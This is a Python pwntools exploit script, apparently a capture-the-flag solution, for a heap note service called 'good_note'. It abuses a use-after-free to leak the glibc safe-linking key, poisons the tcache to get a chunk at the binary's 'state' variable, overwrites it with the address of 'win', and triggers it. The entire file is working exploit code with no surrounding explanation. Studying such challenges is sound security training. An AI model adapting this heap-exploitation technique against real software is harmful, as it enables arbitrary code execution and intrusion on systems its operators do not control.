#!/usr/bin/env python3
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument('--host', default='127.0.0.1')
parser.add_argument('--port', type=int, default=24683)
parser.add_argument('--binary', default='./good_note')
parser.add_argument('--debug', action='store_true')
args = parser.parse_args()
context.binary = ELF(args.binary, checksec=False)
context.log_level = 'debug' if args.debug else 'info'
elf = context.binary
io = remote(args.host, args.port)
PROMPT = b'command >> '

def command(n):
    io.sendline(str(n).encode())

def create():
    command(1)
    io.recvuntil(b'creation success\n')
    io.recvuntil(PROMPT)

def delete(idx):
    command(3)
    io.sendlineafter(b'index >> ', str(idx).encode())
    io.recvuntil(PROMPT)

def edit(idx, data):
    assert len(data) == 0x20
    command(2)
    io.sendlineafter(b'index >> ', str(idx).encode())
    io.sendafter(b'content >> ', data)
    io.recvuntil(PROMPT)

def show():
    command(4)
    return io.recvuntil(PROMPT, drop=True)

try:
    io.recvuntil(PROMPT)
    create()                  # notes[0] -> A
    create()                  # notes[1] -> B
    delete(0)                 # A -> tcache
    out = show()
    marker = b'notes[0x0]\n'
    if marker not in out:
        log.error('Unexpected show output: %r', out)
    leak = out.split(marker, 1)[1].split(b'\nnotes[0x1]\n', 1)[0]
    key = u64(leak[:8].ljust(8, b'\x00'))
    log.info('safe-linking key: %#x', key)
    if not key:
        log.error('Failed to leak key')

    state = elf.sym['state']
    win = elf.sym['win']
    log.info('state=%#x win=%#x', state, win)

    # A is the sole tcache entry; freeing B next makes B -> A.
    delete(1)                 # tcache B -> A
    # Overwrite B->next to point to state. B is now the tcache head.
    edit(1, p64(state ^ key).ljust(0x20, b'\x00'))
    create()                  # notes[0] reuses B; tcache head becomes state
    create()                  # notes[1] points at state
    edit(1, p64(win).ljust(0x20, b'\x00'))
    command(0)
    print(io.recvall(timeout=3).decode(errors='replace'))
finally:
    io.close()
